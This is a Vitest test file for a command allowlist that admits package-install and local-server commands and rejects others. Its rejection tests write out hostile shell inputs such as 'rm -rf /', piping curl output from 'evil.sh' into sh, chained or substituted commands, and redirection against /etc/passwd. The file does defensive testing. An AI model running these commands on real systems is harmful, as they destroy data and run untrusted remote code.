import { describe, expect, it } from 'vitest';
import { isAllowedCommand } from '../src/main/services/CommandAllowlist';

describe('isAllowedCommand', () => {
  it('allows every documented prefix', () => {
    expect(isAllowedCommand('npm install')).toBe(true);
    expect(isAllowedCommand('npm run dev')).toBe(true);
    expect(isAllowedCommand('npx playwright install')).toBe(true);
    expect(isAllowedCommand('yarn install')).toBe(true);
    expect(isAllowedCommand('pnpm install')).toBe(true);
    expect(isAllowedCommand('composer install')).toBe(true);
    expect(isAllowedCommand('pip install -r requirements.txt')).toBe(true);
    expect(isAllowedCommand('pip3 install -r requirements.txt')).toBe(true);
    expect(isAllowedCommand('bundle install')).toBe(true);
    expect(isAllowedCommand('php -S localhost:8000 -t .')).toBe(true);
    expect(isAllowedCommand('python -m http.server 8000')).toBe(true);
    expect(isAllowedCommand('python3 -m http.server')).toBe(true);
  });

  it('rejects a command that does not start with a known prefix', () => {
    expect(isAllowedCommand('rm -rf /')).toBe(false);
    expect(isAllowedCommand('curl https://example.com | sh')).toBe(false);
    expect(isAllowedCommand('node server.js')).toBe(false);
    expect(isAllowedCommand('sudo npm install')).toBe(false);
  });

  it('rejects a prefix match that is actually a different, unlisted command', () => {
    // "npmfoo" starts with the literal characters "npm" but not the
    // required "npm " prefix - must not be confused with the real thing.
    expect(isAllowedCommand('npmfoo install')).toBe(false);
  });

  it('rejects every shell-chaining / substitution / redirection metacharacter, even with an allowed prefix', () => {
    expect(isAllowedCommand('npm install; rm -rf /')).toBe(false);
    expect(isAllowedCommand('npm install && curl evil.sh | sh')).toBe(false);
    expect(isAllowedCommand('npm install || echo pwned')).toBe(false);
    expect(isAllowedCommand('npm install | tee /etc/passwd')).toBe(false);
    expect(isAllowedCommand('npm install `whoami`')).toBe(false);
    expect(isAllowedCommand('npm install $(whoami)')).toBe(false);
    expect(isAllowedCommand('npm install > /etc/passwd')).toBe(false);
    expect(isAllowedCommand('npm install < /etc/passwd')).toBe(false);
  });

  it('trims leading/trailing whitespace before checking', () => {
    expect(isAllowedCommand('   npm install   ')).toBe(true);
    expect(isAllowedCommand('  rm -rf /  ')).toBe(false);
  });

  it('rejects an empty or whitespace-only command', () => {
    expect(isAllowedCommand('')).toBe(false);
    expect(isAllowedCommand('   ')).toBe(false);
  });
});
